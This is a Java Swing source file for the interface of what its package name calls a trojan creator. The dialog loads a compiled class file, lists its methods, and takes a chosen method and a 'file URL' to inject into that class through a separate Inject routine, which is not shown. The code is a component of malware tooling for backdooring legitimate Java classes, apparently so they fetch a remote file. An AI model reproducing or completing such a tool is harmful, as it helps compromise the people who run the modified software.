package me.server.createtrojan;

import jdk.internal.org.objectweb.asm.ClassReader;
import jdk.internal.org.objectweb.asm.ClassVisitor;
import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.MethodVisitor;

import javax.swing.*;
import java.awt.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;

import static org.objectweb.asm.Opcodes.ASM4;

public class InjectWindow extends JDialog {
    String path = null;
    public InjectWindow() {
        setTitle("class注入");
        JComboBox<String> comboBox = new JComboBox<>();
        JTextField textField1 = new JTextField(25);
        JTextField textField2 = new JTextField(30);
        textField2.setEditable(false);
        JPanel panel1 = new JPanel();
        JPanel panel2 = new JPanel();
        JPanel panel3 = new JPanel();
        JLabel label = new JLabel("注入的方法名称");
        JLabel label1 = new JLabel("文件URL");
        panel2.add(label);
        panel2.add(comboBox);
        panel2.add(label1);
        panel2.add(textField1);
        JButton button1 = new JButton("选择文件");
        JButton button2 = new JButton("生成class");
        panel3.add(button1);
        panel3.add(button2);
        add(panel1,BorderLayout.NORTH);
        add(panel2,BorderLayout.NORTH);
        add(textField2);
        add(panel3,BorderLayout.SOUTH);
        setLocationRelativeTo(null);
        setSize(700,250);
        setVisible(true);
        button1.addActionListener(a->{
            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setDialogTitle("选择class文件");
            fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
            int i = fileChooser.showOpenDialog(null);
            if(i == JFileChooser.APPROVE_OPTION) {
                path = fileChooser.getSelectedFile().getAbsolutePath();
                try {
                    FileInputStream inputStream = new FileInputStream(path);
                    ClassReader reader = new ClassReader(inputStream);
                    ClassVisitor change = new ClassVisitor(ASM4) {
                        @Override
                        public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
                            comboBox.addItem("方法名:" + name + " 参数:" + desc);
                            return super.visitMethod(access, name, desc, signature, exceptions);
                        }
                    };
                    textField2.setText("当前选择文件:" + path);
                    reader.accept(change, ClassReader.EXPAND_FRAMES);
                    inputStream.close();
                }catch (Exception e) {
                }
            }
        });
        button2.addActionListener(a->{
            if(path == null) {
                JOptionPane.showMessageDialog(null,"未选择文件!","错误",JOptionPane.ERROR_MESSAGE);
            }else {
                int index = comboBox.getSelectedIndex();
                String str = comboBox.getItemAt(index);
                Inject.inject(path,str.substring(str.indexOf("方法名:") + 4,str.indexOf("参数:")).trim(),str.substring(str.indexOf("参数:") + 3).trim(),textField1.getText());
            }
        });
    }
}